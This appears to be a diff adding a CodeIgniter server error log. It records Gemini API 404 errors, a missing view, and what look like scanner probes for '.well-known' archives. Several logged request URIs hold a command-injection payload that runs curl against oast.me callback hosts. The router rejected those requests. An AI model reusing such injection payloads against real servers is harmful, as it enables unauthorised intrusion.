@@ -1,0 +1,174 @@
+ERROR - 2025-07-23 01:33:28 --> API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 01:33:28 --> Gemini API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 01:54:24 --> API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 01:54:25 --> Gemini API Error: 22 : The requested URL returned error: 404 
+CRITICAL - 2025-07-23 01:54:25 --> CodeIgniter\View\Exceptions\ViewException: Invalid file: "auth/register.php"
+[Method: GET, Route: register]
+in SYSTEMPATH/Exceptions/FrameworkException.php on line 39.
+ 1 SYSTEMPATH/View/View.php(212): CodeIgniter\Exceptions\FrameworkException::forInvalidFile()
+ 2 SYSTEMPATH/Common.php(1173): CodeIgniter\View\View->render()
+ 3 APPPATH/Controllers/AuthController.php(195): view()
+ 4 SYSTEMPATH/CodeIgniter.php(933): App\Controllers\AuthController->showRegisterForm()
+ 5 SYSTEMPATH/CodeIgniter.php(507): CodeIgniter\CodeIgniter->runController()
+ 6 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 7 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 8 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 9 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+ERROR - 2025-07-23 01:54:25 --> API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 01:54:25 --> Gemini API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 01:58:49 --> API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 01:58:50 --> Gemini API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 02:21:28 --> API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 02:21:29 --> Gemini API Error: 22 : The requested URL returned error: 404 
+CRITICAL - 2025-07-23 03:25:29 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (2).zip"
+[Method: GET, Route: .well-known%20%282%29.zip]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 03:25:30 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (2).rar"
+[Method: GET, Route: .well-known%20%282%29.rar]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 03:25:31 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (2).tar"
+[Method: GET, Route: .well-known%20%282%29.tar]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 03:25:32 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (2).tar.gz"
+[Method: GET, Route: .well-known%20%282%29.tar.gz]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 03:25:33 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (3).zip"
+[Method: GET, Route: .well-known%20%283%29.zip]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 03:25:34 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (3).rar"
+[Method: GET, Route: .well-known%20%283%29.rar]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 03:25:36 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (3).tar"
+[Method: GET, Route: .well-known%20%283%29.tar]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 03:25:37 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: ".well-known (3).tar.gz"
+[Method: GET, Route: .well-known%20%283%29.tar.gz]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+ERROR - 2025-07-23 07:48:00 --> API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 07:48:01 --> Gemini API Error: 22 : The requested URL returned error: 404 
+CRITICAL - 2025-07-23 08:23:58 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: "×¿Ø¿Ø¿·;{curl,http:"
+[Method: GET, Route: %04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37gpdpri1dojsgid.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37ggnqtqaa3fwo66.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 08:23:58 --> ErrorException: Uncaught CodeIgniter\Format\Exceptions\FormatException: Failed to parse JSON string. Error: Malformed UTF-8 characters, possibly incorrectly encoded in /var/www/udara/system/Format/JSONFormatter.php:45
+Stack trace:
+#0 /var/www/udara/system/Format/JSONFormatter.php(45): CodeIgniter\Format\Exceptions\FormatException::forInvalidJSON()
+#1 /var/www/udara/system/API/ResponseTrait.php(345): CodeIgniter\Format\JSONFormatter->format()
+#2 /var/www/udara/system/API/ResponseTrait.php(103): CodeIgniter\Debug\ExceptionHandler->format()
+#3 /var/www/udara/system/Debug/ExceptionHandler.php(85): CodeIgniter\Debug\ExceptionHandler->respond()
+#4 /var/www/udara/system/Debug/Exceptions.php(163): CodeIgniter\Debug\ExceptionHandler->handle()
+#5 [internal function]: CodeIgniter\Debug\Exceptions->exceptionHandler()
+#6 {main}
+  thrown
+ã€Previous Exceptionã€‘
+CodeIgniter\HTTP\Exceptions\BadRequestException
+The URI you submitted has disallowed characters: "×¿Ø¿Ø¿·;{curl,http:"
+#0 /var/www/udara/system/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+#1 /var/www/udara/system/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+#2 /var/www/udara/system/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+#3 /var/www/udara/system/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+#4 /var/www/udara/system/Boot.php(334): CodeIgniter\CodeIgniter->run()
+#5 /var/www/udara/system/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+#6 /var/www/udara/public/index.php(56): CodeIgniter\Boot::bootWeb()
+#7 {main}
+[Method: GET, Route: %04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37gpdpri1dojsgid.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37ggnqtqaa3fwo66.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;]
+in SYSTEMPATH/Format/JSONFormatter.php on line 45.
+ 1 [internal function]: CodeIgniter\Debug\Exceptions->shutdownHandler()
+CRITICAL - 2025-07-23 08:23:58 --> CodeIgniter\HTTP\Exceptions\BadRequestException: The URI you submitted has disallowed characters: "×¿Ø¿Ø¿d¸;{curl,http:"
+[Method: GET, Route: %04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37ga7hfkixtea3px.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37g64ho3get7g4nz.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;]
+in SYSTEMPATH/Router/Router.php on line 739.
+ 1 SYSTEMPATH/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+ 2 SYSTEMPATH/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+ 3 SYSTEMPATH/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+ 4 SYSTEMPATH/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+ 5 SYSTEMPATH/Boot.php(334): CodeIgniter\CodeIgniter->run()
+ 6 SYSTEMPATH/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+ 7 FCPATH/index.php(56): CodeIgniter\Boot::bootWeb()
+CRITICAL - 2025-07-23 08:23:58 --> ErrorException: Uncaught CodeIgniter\Format\Exceptions\FormatException: Failed to parse JSON string. Error: Malformed UTF-8 characters, possibly incorrectly encoded in /var/www/udara/system/Format/JSONFormatter.php:45
+Stack trace:
+#0 /var/www/udara/system/Format/JSONFormatter.php(45): CodeIgniter\Format\Exceptions\FormatException::forInvalidJSON()
+#1 /var/www/udara/system/API/ResponseTrait.php(345): CodeIgniter\Format\JSONFormatter->format()
+#2 /var/www/udara/system/API/ResponseTrait.php(103): CodeIgniter\Debug\ExceptionHandler->format()
+#3 /var/www/udara/system/Debug/ExceptionHandler.php(85): CodeIgniter\Debug\ExceptionHandler->respond()
+#4 /var/www/udara/system/Debug/Exceptions.php(163): CodeIgniter\Debug\ExceptionHandler->handle()
+#5 [internal function]: CodeIgniter\Debug\Exceptions->exceptionHandler()
+#6 {main}
+  thrown
+ã€Previous Exceptionã€‘
+CodeIgniter\HTTP\Exceptions\BadRequestException
+The URI you submitted has disallowed characters: "×¿Ø¿Ø¿d¸;{curl,http:"
+#0 /var/www/udara/system/Router/Router.php(207): CodeIgniter\Router\Router->checkDisallowedChars()
+#1 /var/www/udara/system/CodeIgniter.php(832): CodeIgniter\Router\Router->handle()
+#2 /var/www/udara/system/CodeIgniter.php(455): CodeIgniter\CodeIgniter->tryToRouteIt()
+#3 /var/www/udara/system/CodeIgniter.php(354): CodeIgniter\CodeIgniter->handleRequest()
+#4 /var/www/udara/system/Boot.php(334): CodeIgniter\CodeIgniter->run()
+#5 /var/www/udara/system/Boot.php(67): CodeIgniter\Boot::runCodeIgniter()
+#6 /var/www/udara/public/index.php(56): CodeIgniter\Boot::bootWeb()
+#7 {main}
+[Method: GET, Route: %04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37ga7hfkixtea3px.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;%7Bcurl,http:/d1nemqln1q6s5507c37g64ho3get7g4nz.oast.me%20-H%20%27User-Agent:%20m3S4cd%27%7D;]
+in SYSTEMPATH/Format/JSONFormatter.php on line 45.
+ 1 [internal function]: CodeIgniter\Debug\Exceptions->shutdownHandler()
+ERROR - 2025-07-23 08:40:15 --> API Error: 22 : The requested URL returned error: 404 
+ERROR - 2025-07-23 08:40:16 --> Gemini API Error: 22 : The requested URL returned error: 404 
